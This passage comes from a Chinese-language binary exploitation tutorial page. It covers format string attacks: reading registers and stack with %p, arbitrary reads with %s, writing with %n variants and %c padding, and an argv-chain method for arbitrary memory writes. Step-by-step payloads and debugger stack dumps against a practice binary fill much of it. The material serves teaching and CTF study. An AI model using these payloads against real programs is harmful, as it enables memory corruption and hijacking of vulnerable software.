<p>讀取的部分主要可以有 <code>%p</code> 以及 <code>%s</code> 兩種做法，<code>%p</code> 可以用來讀取 register 以及 stack 上的值，而 <code>%s</code> 則可以做到任意讀取</p>
<h3 id="p">%p</h3>
<p>在讀取時使用的是 <code>%p</code> ，可以用 16 進位印出某個 register (stack 某位置) 存的值，以下來個範例</p>
<p><img alt="" src="https://i.imgur.com/COSz0S8.png" /></p>
<p>這邊輸入的 payload 是</p>
<div class="highlight"><pre><span></span><code>%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
</code></pre></div>
<p>輸出如下</p>
<div class="highlight"><pre><span></span><code>0x1,0x7ffff7dd3790,0xa,(nil),0x7ffff7fe9700,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x400070,0x7fffffffe940,0x7b74f8be5cadfe00,0x4006f0
 |         |        |    |         |               |                   |                   |                 |      
rsi       rdx      rcx  r8        r9              rsp              rsp + 0x8           rsp + 0x10        rsp + 0x18
</code></pre></div>
<p>假設想要印出 <code>rsp + 0x28</code> 的值也可以直接使用 <code>$</code> 來指定</p>
<div class="highlight"><pre><span></span><code>%10$p -&gt; 0x400070
</code></pre></div>
<h3 id="s">%s</h3>
<p><code>%s</code> 跟 <code>%p</code> 讀取的目標不一樣，<code>%s</code> 是把存的值當成指標去讀取，而 <code>%p</code> 是把存的值直接送出來</p>
<p>在正常使用 <code>%s</code> 時，放入的參數是某個字串的指標，<code>printf</code> 會把指標所指的地方當成字串印出</p>
<div class="highlight"><pre><span></span><code><span class="kt">char</span> <span class="n">str</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;Hello World!&quot;</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>               <span class="c1">// Hello World!</span>
</code></pre></div>
<p>這種機制就可以用來任意讀取，假設輸入的 payload 在 stack 上的話，可以把想要印出的位址寫在 payload 上，接著使用 <code>%s</code> 去讀出來，以下是範例</p>
<p><img alt="" src="https://i.imgur.com/5Kp4CMK.png" /></p>
<p>這時候的輸入如下，<code>aaaa</code> 的部分是為了把要印的位址推到 <code>rsp + 0x8</code> ，這樣 <code>rsp + 0x8</code> 就會剛好是 <code>0x6262626262626262</code> ("bbbbbbbb")</p>
<div class="highlight"><pre><span></span><code>%7$saaaabbbbbbbb
</code></pre></div>
<p>在執行 <code>printf</code> 時會去抓 <code>0x6262626262626262</code> 所存的值並當成字串印出，不過這次的範例沒有這個位址，所以會失敗</p>
<h2 id="_3">寫入</h2>
<p><code>printf</code> 使用 <code>%n</code> 時可以寫入指定的位置，也可以更近一步使用 argv chain 來達成任意位址寫入</p>
<p><code>%n</code> 跟 <code>%s</code> 類似，一樣是把存的值當成指標，<code>%s</code> 將指標指的位置讀出來，而 <code>%n</code> 則是把數值寫入指標所指的位置</p>
<p>假設 stack 上的 <code>rsp + 0x10</code> 如下，用 <code>%8$n</code> 寫入這格時，實際上會寫到 <code>0x7ffff7fea000</code> </p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a0d000 --&gt; 0x3010102464c457f
</code></pre></div>
<p>如果是寫 <code>0xdeadbeef</code> 的話，這段就會變成</p>
<div class="highlight"><pre><span></span><code>0016| 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7fffdeadbeef
</code></pre></div>
<h3 id="_4">寫入的值</h3>
<p>寫入的值是在遇到 <code>%n</code> 前總共印了幾個字元</p>
<p>例如 payload 如下，<code>%n</code> 前有 8 個 <code>a</code> ，所以會寫 8 到指定的位置</p>
<div class="highlight"><pre><span></span><code>aaaaaaaa%n
</code></pre></div>
<p>如果有多個 <code>%n</code> 的話就要看前面到底多長</p>
<p>例如 payload 如下，第一個 <code>%n</code> 前有 8 個 <code>a</code> ，會寫 8 到 <code>rsp</code> 指的位置，而第二個 <code>%n</code> 前有 8 個 <code>a</code> 以及 8 個 <code>b</code> ，共 16 字元，所以會寫 16 到 <code>rsp + 8</code> 所指的位置</p>
<div class="highlight"><pre><span></span><code>aaaaaaaa%6$nbbbbbbbb%7$n
</code></pre></div>
<p>不過這樣寫入要打很久，這時候可以用到 <code>%c</code> 來構成 payload</p>
<p>先來看看 <code>%c</code> 的用法，可以直接指定要印出的長度</p>
<div class="highlight"><pre><span></span><code><span class="c1">// input</span>
<span class="kt">char</span> <span class="n">ch</span> <span class="o">=</span> <span class="sc">&#39;a&#39;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%3c&quot;</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&quot;%5c&quot;</span><span class="p">);</span>
<span class="c1">// output</span>
<span class="s">&quot;  a&quot;</span>
<span class="s">&quot;    a&quot;</span>
</code></pre></div>
<p>利用 <code>%c</code> 修改一下上面的範例，可以達成一樣的效果</p>
<div class="highlight"><pre><span></span><code>%8c%6$n%8c%7$n
</code></pre></div>
<h3 id="_5">寫入的長度</h3>
<p>上面雖然都用 <code>%n</code> 來舉例，但其實寫入可以指定不同的長度</p>
<table>
<thead>
<tr>
<th align="center">格式</th>
<th align="center">長度 (byte)</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center">%lln</td>
<td align="center">8 bytes</td>
</tr>
<tr>
<td align="center">%n</td>
<td align="center">4 bytes</td>
</tr>
<tr>
<td align="center">%hn</td>
<td align="center">2 bytes</td>
</tr>
<tr>
<td align="center">%hhn</td>
<td align="center">1 byte</td>
</tr>
</tbody>
</table>
<p>以一開始的例子來說</p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a0d000 --&gt; 0x3010102464c457f
</code></pre></div>
<p>寫 <code>aaaa%8$lln</code> </p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x4
</code></pre></div>
<p>寫 <code>aaaa%8$n</code></p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7fff00000004
</code></pre></div>
<p>寫 <code>aaaa%8$hn</code></p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a00004
</code></pre></div>
<p>寫 <code>aaaa%8$hhn</code></p>
<div class="highlight"><pre><span></span><code><span class="m">0016</span><span class="p">|</span> 0x7fffffffdb88 --&gt; 0x7ffff7fea000 --&gt; 0x7ffff7a0d004
</code></pre></div>
<p>一般在使用的時候，通常不會一次寫入整段的資料，例如要寫入 <code>0xdeadbeef</code> 的話，就必須要一次寫 3735928559 個字元，需要跑超久的，因此會配合 argv chain 分成 <code>0xde</code>、<code>0xad</code>、<code>0xbe</code>、<code>0xef</code> 來多次寫入</p>
<h3 id="argv-chain">argv chain</h3>
<p>argv chain 是利用 stack 上的 argv 來達成任意寫入的功能</p>
<p>stack 上都會有一段是 argv 的位置，argv chain 上的兩段位址都在 stack 上且可以控制</p>
<div class="highlight"><pre><span></span><code><span class="m">0000</span><span class="p">|</span> 0x7fffffffe820 --&gt; 0x333231 <span class="o">(</span><span class="s1">&#39;123&#39;</span><span class="o">)</span>
<span class="m">0008</span><span class="p">|</span> 0x7fffffffe828 --&gt; 0x40073d <span class="o">(</span>&lt;__libc_csu_init+77&gt;:    add    rbx,0x1<span class="o">)</span>
<span class="m">0016</span><span class="p">|</span> 0x7fffffffe830 --&gt; 0x0
<span class="m">0024</span><span class="p">|</span> 0x7fffffffe838 --&gt; 0x0
<span class="m">0032</span><span class="p">|</span> 0x7fffffffe840 --&gt; 0x4006f0 <span class="o">(</span>&lt;__libc_csu_init&gt;:   push   r15<span class="o">)</span>
<span class="m">0040</span><span class="p">|</span> 0x7fffffffe848 --&gt; 0x400590 <span class="o">(</span>&lt;_start&gt;:    xor    ebp,ebp<span class="o">)</span>
<span class="m">0048</span><span class="p">|</span> 0x7fffffffe850 --&gt; 0x7fffffffe940 --&gt; 0x1
<span class="m">0056</span><span class="p">|</span> 0x7fffffffe858 --&gt; 0xa0a688c62ba6ff00
<span class="m">0064</span><span class="p">|</span> 0x7fffffffe860 --&gt; 0x4006f0 <span class="o">(</span>&lt;__libc_csu_init&gt;:   push   r15<span class="o">)</span>
<span class="m">0072</span><span class="p">|</span> 0x7fffffffe868 --&gt; 0x7ffff7a2d830 <span class="o">(</span>&lt;__libc_start_main+240&gt;:   mov    edi,eax<span class="o">)</span>
<span class="m">0080</span><span class="p">|</span> 0x7fffffffe870 --&gt; 0x0
+--------------------------------------------------------------------------------------------------------------+
<span class="p">|</span><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80   <span class="o">(</span><span class="s2">&quot;/home/frozenkp/challenge/format/a.out&quot;</span><span class="o">)</span>        <span class="p">|</span>
+--------------------------------------------------------------------------------------------------------------+
<span class="m">0096</span><span class="p">|</span> 0x7fffffffe880 --&gt; 0x1f7ffcca0
<span class="m">0104</span><span class="p">|</span> 0x7fffffffe888 --&gt; 0x400686 <span class="o">(</span>&lt;main&gt;:  push   rbp<span class="o">)</span>
<span class="m">0112</span><span class="p">|</span> 0x7fffffffe890 --&gt; 0x0
<span class="m">0120</span><span class="p">|</span> 0x7fffffffe898 --&gt; 0xc5142c5f7392e1ee
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6f682f
              <span class="p">|</span>                  <span class="p">|</span>                  <span class="p">|</span>
          rsp + 0x58         rsp + 0x128        rsp + 0x360
            argv0              argv1              argv2
</code></pre></div>
<p>可以透過寫入 argv1 來改動 argv2 寫的內容 (address)，最後再透過寫入 argv2 來寫入指定的位址</p>
<p>以下範例，假設要在 <code>0xdeadbeef</code> 寫入 <code>0x4</code></p>
<h4 id="argv1-2-bytes">第一步：透過 argv1 寫 2 bytes</h4>
<p>一開始先在 argv2 的值寫上 <code>0xbeef</code> ，payload 如下</p>
<div class="highlight"><pre><span></span><code>%48879c%43$hn
</code></pre></div>
<p>寫完後如下</p>
<div class="highlight"><pre><span></span><code>                                                                             +----+
<span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0x72662f656d6f<span class="p">|</span>beef<span class="p">|</span>
                                                                             +----+
</code></pre></div>
<h4 id="argv0-2">第二步：透過 argv0 移動 2</h4>
<p>把 argv2 移動 2，payload 如下</p>
<div class="highlight"><pre><span></span><code>%2c%17$hhn
</code></pre></div>
<p>寫完後如下，argv2 從 <code>0x7fffffffeb80</code> 變成 <code>0x7fffffffeb82</code></p>
<div class="highlight"><pre><span></span><code><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb82 --&gt; 0x7a6f72662f656d6f
</code></pre></div>
<h4 id="argv1-2-bytes_1">第三步：透過 argv1 寫 2 bytes</h4>
<p>原本只能寫上 <code>0xbeef</code> ，後面的部分透過第二步移動 argv2 以後就可以用 <code>%hn</code> 碰到了</p>
<p>因為剩下只要寫掉 <code>0xdead</code> 就好，所以我這邊直接使用 <code>%lln</code> 把後面都用 0 蓋掉</p>
<div class="highlight"><pre><span></span><code>%57005c%43$lln
</code></pre></div>
<p>寫完後如下</p>
<div class="highlight"><pre><span></span><code>                                                               +------+
<span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb82 --&gt; <span class="p">|</span>0xdead<span class="p">|</span>
                                                               +------+
</code></pre></div>
<h4 id="argv0">第四步：透過 argv0 移動回來</h4>
<p>把 argv2 移動回來，payload 如下</p>
<div class="highlight"><pre><span></span><code>%17$hhn
</code></pre></div>
<p>寫完後如下，分兩段寫後就可以把整個 <code>0xdeadbeef</code> 寫上去了</p>
<div class="highlight"><pre><span></span><code>                                                               +----------+
<span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; <span class="p">|</span>0xdeadbeef<span class="p">|</span>
                                                               +----------+
</code></pre></div>
<h4 id="argv2-0xdeadbeef">第五步：透過 argv2 寫入 0xdeadbeef</h4>
<p>這邊再寫入的時候，如果要寫得值太大，一樣要像前面一樣分成多段來寫，而這個範例只要寫入 <code>0x4</code> 所以就直接寫就好了</p>
<div class="highlight"><pre><span></span><code>%4c%114$lln
</code></pre></div>
<p>寫完後，<code>0xdeadbeef</code> 存的值就會被改掉了</p>
<div class="highlight"><pre><span></span><code><span class="m">0088</span><span class="p">|</span> 0x7fffffffe878 --&gt; 0x7fffffffe948 --&gt; 0x7fffffffeb80 --&gt; 0xdeadbeef --&gt; 0x4
</code></pre></div>
<blockquote>
<p>這題範例為了講解方便，所以一次都寫 2 bytes，建議是一次寫 1 byte 用 for 迴圈自動移動完成即可</p>
</blockquote>
<h2 id="_printf_chk">_printf_chk</h2>
<p>有時候會遇到使用的是 <code>_printf_chk</code> 而非 <code>printf</code>，其實這兩個差不多，只不過 <code>_printf_chk</code> 多了以下限制</p>
<ul>
<li>不能用 <code>%n</code> 系列寫值</li>
<li>不能用 <code>%x$y</code> 指定參數</li>
</ul>
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
        
          <a href="../stack_migration/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
            </div>
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Stack Migration
              </div>
            </div>
          </a>
        
        
          <a href="../../reverse/radare2/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                radare2
              </div>
            </div>
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/vendor.7e0ee788.min.js"></script>
      <script src="../../assets/javascripts/bundle.b3a72adc.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "../..",
          features: ['navigation.tabs', 'navigation.instant'],
          search: Object.assign({
            worker: "../../assets/javascripts/worker/search.4ac00218.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
    
  </body>
</html>